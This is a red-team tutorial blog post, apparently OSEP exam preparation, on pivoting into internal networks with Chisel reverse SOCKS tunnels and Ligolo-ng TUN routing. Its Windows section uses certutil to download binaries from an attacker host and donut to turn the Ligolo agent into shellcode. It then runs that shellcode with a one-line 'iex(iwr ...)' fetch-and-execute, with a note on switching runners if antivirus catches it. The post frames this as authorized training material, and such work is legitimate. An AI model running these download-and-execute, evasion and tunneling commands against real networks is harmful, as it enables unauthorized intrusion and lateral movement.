---
title: "Port Forwarding and Pivoting with Chisel and Ligolo-ng (Linux + Windows)"
date: 2026-02-21
categories: [Red Team, Tunneling, Pivoting]
tags: [chisel, ligolo-ng, socks, port-forward, pivot, osep]
image: /assets/img/portforw.jpg
---

# Port Forwarding and Pivoting with Chisel and Ligolo-ng



## Disclaimer

This post is for authorized security testing and lab environments only.\
Only use these techniques on systems you own or have explicit permission
to assess.

------------------------------------------------------------------------

## Why Port Forwarding Matters in Pivoting

Port forwarding and tunneling allow you to reach internal networks that
are not directly accessible from your attacker machine.

Two commonly used tools:

**Chisel**
Fast, simple TCP tunneling and SOCKS pivoting. Excellent for quick
pivots and proxychains workflows.

**Ligolo-ng**
A network-native pivot using a TUN interface, allowing you to route
traffic as if directly connected to the internal subnet.

------------------------------------------------------------------------

# Part 1 -- Chisel Pivoting (Reverse SOCKS Tunnel)

## Kali Setup (Server)

``` bash
./chisel server -p 8000 --reverse --socks5
```

Verify listening:

``` bash
ss -lntp | grep 8000
```

------------------------------------------------------------------------

## Linux Target (Client)

``` bash
./chisel client 192.168.1.1:8000 R:1080:socks &
```

Configure proxychains:

    socks5 127.0.0.1 1080

Example usage:

``` bash
proxychains nmap -sT -Pn 10.10.10.0/24
```

------------------------------------------------------------------------

## Windows Target (Client)

Transfer:

``` powershell
certutil -urlcache -split -f http://192.168.1.1/chisel.exe chisel.exe
```

Host from Kali:

``` bash
python3 -m http.server 80
```

Run client:

``` powershell
.\chisel.exe client 192.168.1.1:8000 R:1080:socks
```

------------------------------------------------------------------------

# Part 2 -- Ligolo-ng Pivoting (TUN Based Routing)

## Build Ligolo-ng

``` bash
go build -o agent cmd/agent/main.go
go build -o proxy cmd/proxy/main.go
```

Windows build:

``` bash
GOOS=windows go build -o agent.exe cmd/agent/main.go
GOOS=windows go build -o proxy.exe cmd/proxy/main.go
```

------------------------------------------------------------------------

## Kali Setup (Proxy + TUN)

``` bash
sudo ip tuntap add user <your_username> mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

------------------------------------------------------------------------

## Target Setup (Agent)

``` bash
./agent -connect <kali_ip>:11601 -ignore-cert
```

------------------------------------------------------------------------

## Route Internal Subnet

``` bash
sudo ip route add 10.1.2.0/24 dev ligolo
```

Start tunnel inside Ligolo:

    start

Pro-Tip: If you are pivoting into a Windows environment and can't ping targets, remember that Windows Firewall often drops ICMP by default. Even if the host looks "down" via ping, try a TCP port check (e.g., nc -zv 10.1.2.x 445) to confirm the tunnel is active.

------------------------------------------------------------------------

# Part 3 -- Running Ligolo Agent via PowerShell (Shellcode Runner)

Reference:
<a href="https://github.com/Extravenger/OSEPlayground/tree/main/04%20-%20Tunneling" target="_blank" rel="noopener">OSEP Playground Tunneling Reference</a>

------------------------------------------------------------------------

## A. Convert agent.exe to Shellcode

``` bash
donut -f 1 -o agent.bin -a 2 -p "-connect your-server:11601 -ignore-cert" -i agent.exe
```

`-a 2` indicates x64 architecture.

------------------------------------------------------------------------

## B. Confirm 64-bit Process

PowerShell:

``` powershell
[Environment]::Is64BitProcess
```

CMD:

``` cmd
set p
```

Should display:

    PROCESSOR_ARCHITECTURE=AMD64

------------------------------------------------------------------------

## C. Use ligolo.ps1 Runner

Update inside `ligolo.ps1`:

``` powershell
$url = "http://192.168.1.1/agent.bin"
```

Serve files from Kali:

``` bash
python3 -m http.server 80
```

Execute from target:

``` powershell
iex(iwr http://192.168.1.1/ligolo.ps1 -UseBasicParsing)
```

If detected by AV, consider using `ligolo-psrunner.ps1` alternative.

------------------------------------------------------------------------

# Cleanup

## Remove Ligolo Interface

``` bash
sudo ip link set ligolo down
sudo ip link delete ligolo
```

## Stop Chisel

``` bash
ps aux | grep chisel
kill -9 <pid>
```

------------------------------------------------------------------------

# Tool Comparison Table

| Feature       | Chisel                         | Ligolo-ng                                  |
|--------------|---------------------------------|--------------------------------------------|
| Traffic Type | TCP (via SOCKS proxy)           | Full Network Stack (ICMP / UDP / TCP)      |
| Ease of Use  | High (No sudo/admin required)   | Medium (Requires TUN + root on Kali)       |
| Performance  | Good                            | Excellent (Native routing feel)            |
| Nmap Support | Requires proxychains + -sT      | Works natively (e.g., `nmap 10.1.2.1`)     |

------------------------------------------------------------------------

# Credits

- <a href="https://github.com/nicocha30/ligolo-ng" target="_blank" rel="noopener">Ligolo-ng</a>
- <a href="https://github.com/jpillora/chisel" target="_blank" rel="noopener">Chisel</a>
- <a href="https://github.com/Extravenger/OSEPlayground/tree/main/04%20-%20Tunneling" target="_blank" rel="noopener">OSEP Playground Tunneling Reference</a>

------------------------------------------------------------------------

# Final Note

Always document:

-   Entry point
-   Pivot host
-   Internal subnet
-   Tool used and why
-   Port mappings and listeners

Clear documentation improves reproducibility and reporting quality.



